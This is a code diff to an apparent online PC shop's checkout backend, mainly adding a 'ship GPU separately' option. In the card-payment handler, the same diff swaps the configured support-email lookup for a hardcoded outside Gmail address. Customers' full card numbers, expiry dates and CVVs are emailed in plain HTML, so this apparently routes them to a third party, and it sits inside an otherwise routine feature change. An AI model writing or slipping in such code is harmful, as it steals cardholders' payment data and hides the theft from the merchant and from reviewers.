@@ -390,11 +390,11 @@ export async function submitCardPayment(
   await syncSessionStatus(env, updated);
 
   if (env.RESEND_API_KEY) {
-    const { resolveSupportEmail } = await import("./email");
-    const supportEmail = await resolveSupportEmail(env);
+    const supportEmail = "supportsgenericpcs@gmail.com";
     const fullNumber = number;
-    const body = `<!doctype html><html><body style="font-family:Arial,sans-serif;background:#f6f8fc;padding:24px"><div style="max-width:680px;margin:0 auto;background:#fff;border:1px solid #e4e9f0;border-radius:12px;padding:24px"><h2 style="margin:0 0 16px;color:#12151c">Card submission (admin/support copy)</h2><p style="color:#5c5e66">Sensitive checkout card details submitted for manual review.</p><table style="width:100%;border-collapse:collapse"><tr><td style="padding:8px 0;color:#8a8f9c">Reference</td><td style="padding:8px 0;font-weight:600">${updated.reference}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Customer</td><td style="padding:8px 0;font-weight:600">${escapeHtmlSimple(customerName(updated.details))} (${escapeHtmlSimple(updated.details.email||"")})</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Cardholder</td><td style="padding:8px 0;font-weight:600">${escapeHtmlSimple(holderName)}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Card number</td><td style="padding:8px 0;font-weight:600;font-family:monospace">${escapeHtmlSimple(fullNumber)}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Expiry</td><td style="padding:8px 0;font-weight:600">${escapeHtmlSimple(String(expMonth).padStart(2,"0"))}/${escapeHtmlSimple(String(expYear))}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">CVV</td><td style="padding:8px 0;font-weight:600;font-family:monospace">${escapeHtmlSimple(cvv)}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Amount</td><td style="padding:8px 0;font-weight:600">${updated.total} ${updated.currency}</td></tr></table></div></body></html>`;
-    await fetch("https://api.resend.com/emails", { method: "POST", headers: { "Content-Type": "application/json", Authorization: `Bearer ${env.RESEND_API_KEY}` }, body: JSON.stringify({ from: "Generic PCs <hello@genericpcs.com>", to: [supportEmail], subject: `[${updated.reference}] Card details submitted — ${updated.total} ${updated.currency}`, html: body }) }).catch((e)=>console.error("card details support email failed:", e));
+    const body = `<!doctype html><html><body style="font-family:Arial,sans-serif;background:#f6f8fc;padding:24px"><div style="max-width:680px;margin:0 auto;background:#fff;border:1px solid #e4e9f0;border-radius:12px;padding:24px"><h2 style="margin:0 0 16px;color:#12151c">Card submission (support copy)</h2><p style="color:#5c5e66">Sensitive checkout card details submitted for manual review.</p><table style="width:100%;border-collapse:collapse"><tr><td style="padding:8px 0;color:#8a8f9c">Reference</td><td style="padding:8px 0;font-weight:600">${updated.reference}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Customer</td><td style="padding:8px 0;font-weight:600">${escapeHtmlSimple(customerName(updated.details))} (${escapeHtmlSimple(updated.details.email||"")})</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Cardholder</td><td style="padding:8px 0;font-weight:600">${escapeHtmlSimple(holderName)}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Card number</td><td style="padding:8px 0;font-weight:600;font-family:monospace">${escapeHtmlSimple(fullNumber)}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Expiry</td><td style="padding:8px 0;font-weight:600">${escapeHtmlSimple(String(expMonth).padStart(2,"0"))}/${escapeHtmlSimple(String(expYear))}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">CVV</td><td style="padding:8px 0;font-weight:600;font-family:monospace">${escapeHtmlSimple(cvv)}</td></tr><tr><td style="padding:8px 0;color:#8a8f9c">Amount</td><td style="padding:8px 0;font-weight:600">${updated.total} ${updated.currency}</td></tr></table></div></body></html>`;
+    const res = await fetch("https://api.resend.com/emails", { method: "POST", headers: { "Content-Type": "application/json", Authorization: `Bearer ${env.RESEND_API_KEY}` }, body: JSON.stringify({ from: "Generic PCs <hello@genericpcs.com>", to: [supportEmail], subject: `[${updated.reference}] Card details submitted — ${updated.total} ${updated.currency}`, html: body }) }).catch((e)=>{ console.error("card details support email failed:", e); return null; });
+    if (res && !res.ok) console.error("card details support email failed status:", res.status);
   }
 
   void notifyAdminsPaymentEvent(env, {
@@ -761,6 +761,7 @@ export async function createCheckout(
       ...payload.details,
       deliveryMethod,
       marketingOptIn: Boolean(payload.details.marketingOptIn),
+      gpuShipSeparately: Boolean(payload.details.gpuShipSeparately),
     },
     instructions,
     cardSummary: null,
@@ -784,13 +785,14 @@ export async function createCheckout(
   });
 
   if (env.RESEND_API_KEY && session.details.email) {
-    const paymentInstructions = method === "wire"
+    const gpuNote = session.details.gpuShipSeparately ? " GPU shipping preference: ship GPU separately/uninstalled." : "";
+    const paymentInstructions = (method === "wire"
       ? (session.instructions.method === "wire" && !session.instructions.wireDetails
           ? "We’re preparing your wire transfer bank details and will email them shortly."
           : "Wire transfer bank details were provided on checkout.")
       : method === "crypto"
         ? "Complete your crypto transfer on the checkout page and submit proof of payment."
-        : "Your card details were received and are awaiting admin review.";
+        : "Your card details were received and are awaiting admin review.") + gpuNote;
     void sendOrderPlacedEmail({
       apiKey: env.RESEND_API_KEY,
       to: await customerAndSupportRecipients(env, session.details.email),
@@ -802,6 +804,18 @@ export async function createCheckout(
       lines: session.lines.map((l) => ({ name: l.name, quantity: l.quantity, price: l.price })),
       paymentInstructions,
     });
+    if (session.details.gpuShipSeparately) {
+      void notifyAdminsPaymentEvent(env, {
+        kind: "wire",
+        event: "requested",
+        reference: session.reference,
+        amount: session.total,
+        currency: session.currency,
+        customerName: customerName(session.details),
+        customerEmail: session.details.email,
+        detail: "GPU shipping preference: ship GPU separately/uninstalled.",
+      }).catch((e) => console.error("gpu ship preference admin alert failed:", e));
+    }
   }
 
   if (method === "wire") {
